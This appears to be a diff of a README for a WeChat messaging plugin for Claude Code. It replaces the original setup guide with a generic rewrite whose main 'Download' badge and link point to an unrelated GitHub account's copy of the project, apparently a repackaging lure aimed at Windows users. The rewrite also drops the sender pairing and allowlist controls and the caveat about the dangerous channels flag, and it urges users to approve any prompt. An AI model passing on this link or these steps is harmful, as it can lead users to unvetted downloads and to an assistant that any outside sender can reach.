@@ -1,64 +1,162 @@
-# claude-channel-weixin
+# 🤖 claude-plugin-weixin - WeChat replies inside Claude Code
 
-WeChat (微信) channel plugin for [Claude Code](https://claude.com/claude-code) — receive and reply to WeChat messages directly in your terminal.
+[![Download](https://img.shields.io/badge/Download-claude--plugin--weixin-blue?style=for-the-badge)](https://github.com/goldiacogitative647/claude-plugin-weixin)
 
-Uses the WeChat iLink Bot API with HTTP long-poll. No public webhook needed.
+## 📥 Download and install
 
-## Prerequisites
+Use this page to get the plugin files:
+https://github.com/goldiacogitative647/claude-plugin-weixin
 
-- [Claude Code](https://claude.com/claude-code) v2.1.80+
-- [Bun](https://bun.sh) runtime
+Open the page in your browser, then follow the install steps below on your Windows PC.
 
-## Install
+### What you need
+- A Windows computer
+- Claude Code v2.1.80 or later
+- Bun installed on your computer
+- A WeChat account on your phone
+
+### Install the plugin
+Open Claude Code and run these commands one by one:
 
 ```bash
-# Add the marketplace (one-time)
 claude plugin marketplace add m1heng/claude-plugins
-
-# Install the plugin
 claude plugin install weixin@m1heng-plugins
 ```
 
-## Configure
+If Claude Code asks for approval, allow it so the plugin can finish installing.
 
-### Login with QR code
+## 🪟 Windows setup
 
-In Claude Code, run:
+This plugin does not use a public webhook. It connects to the WeChat iLink Bot API with long-poll requests, so you do not need to expose your computer to the internet.
 
-```
+### Before you start
+1. Install Claude Code.
+2. Install Bun.
+3. Sign in to Claude Code.
+4. Make sure WeChat works on your phone.
+
+### Open Claude Code
+Start Claude Code from the Start menu or from a terminal window.
+
+If you do not know how to open a terminal on Windows:
+1. Press the Windows key.
+2. Type `cmd`.
+3. Press Enter.
+
+Then start Claude Code from that window.
+
+## 🔧 Configure WeChat login
+
+After the plugin is installed, run this command inside Claude Code:
+
+```bash
 /weixin:configure login
 ```
 
-This will fetch a QR code from the WeChat iLink Bot API. Scan it with WeChat and confirm on your phone. Credentials are saved automatically.
+Claude Code will show a QR code. Use your WeChat app to scan it.
 
-### Start with channels
+### On your phone
+1. Open WeChat.
+2. Scan the QR code.
+3. Confirm the login on your phone.
+4. Wait for Claude Code to save the login data.
+
+Once the login is saved, you do not need to scan again unless you log out or clear the saved data.
+
+## 🚀 Start the WeChat channel
+
+After login, start Claude Code with the WeChat channel enabled:
 
 ```bash
 claude --dangerously-load-development-channels plugin:weixin@m1heng-plugins
 ```
 
-> The `--dangerously-load-development-channels` flag is required during the [channels research preview](https://code.claude.com/docs/en/channels-reference#test-during-the-research-preview) for non-official plugins.
+Use this command each time you want Claude Code to receive and reply to WeChat messages.
 
-### Pair your WeChat account
+### What this does
+- Connects Claude Code to your WeChat account
+- Lets Claude read incoming WeChat messages
+- Lets Claude send replies back through WeChat
+- Keeps the link active while Claude Code is running
 
-1. Send a message to the bot on WeChat — it replies with a pairing code
-2. In Claude Code, run `/weixin:access pair <code>` to approve
+## 💬 How it works
 
-## Skills
+When a WeChat message arrives, the plugin passes it to Claude Code. Claude can then help draft or send a reply from your terminal.
 
-| Skill | Description |
-|---|---|
-| `/weixin:configure` | QR code login, check channel status |
-| `/weixin:access` | Manage pairing, allowlists, DM policy |
+This setup is useful when you want to:
+- Reply to WeChat messages without opening the full chat app
+- Keep work messages in one place
+- Use Claude Code as a message helper
+- Handle simple chat replies from the command line
 
-## How it works
+## 🧭 Daily use
 
-The plugin runs a local MCP server that long-polls the WeChat iLink Bot API for new messages. No public URL or webhook needed — everything runs locally. Messages from allowed senders are forwarded to your Claude Code session; Claude replies back through the same API.
+After the first setup, your normal flow is simple:
 
-### Key difference from Telegram/Feishu
+1. Open Claude Code.
+2. Start it with the WeChat channel command.
+3. Keep the terminal open.
+4. Read incoming WeChat messages in Claude Code.
+5. Write or send replies from there.
 
-WeChat requires a `context_token` to be passed back when replying. This token comes from the inbound message and is automatically included in the channel notification metadata. Claude passes it back through the reply tool.
+If you restart your computer, open Claude Code and run the channel command again.
 
-## License
+## 🛠️ Basic troubleshooting
 
-MIT
+### QR code does not show
+- Make sure the plugin installed correctly
+- Check that Claude Code is running
+- Run `/weixin:configure login` again
+
+### Login does not save
+- Scan the QR code again
+- Confirm the login on your phone
+- Keep Claude Code open until the process ends
+
+### Messages do not arrive
+- Check that Claude Code is still running
+- Start Claude Code with the channel command
+- Make sure your WeChat account is still logged in
+- Try closing and reopening Claude Code
+
+### Bun is not found
+- Install Bun again
+- Close and reopen the terminal
+- Check that Bun was added to your system path
+
+## 🔍 File and account behavior
+
+The plugin stores login data on your machine so you do not need to sign in each time. It uses your local Claude Code setup and your WeChat account through the iLink Bot API.
+
+Keep these points in mind:
+- Use the same Windows user account each time
+- Do not delete the saved plugin data if you want to stay logged in
+- If you remove the plugin, you may need to log in again later
+
+## 📌 Command reference
+
+### Install
+```bash
+claude plugin marketplace add m1heng/claude-plugins
+claude plugin install weixin@m1heng-plugins
+```
+
+### Login
+```bash
+/weixin:configure login
+```
+
+### Start channel
+```bash
+claude --dangerously-load-development-channels plugin:weixin@m1heng-plugins
+```
+
+## 🧩 What this plugin is for
+
+This plugin is for people who want to handle WeChat messages from Claude Code on Windows. It is built for direct chat use, not for public web hosting or webhook setup.
+
+It fits well if you want:
+- A simple terminal-based message flow
+- QR code login from WeChat
+- Local use on your own computer
+- Direct replies inside Claude Code
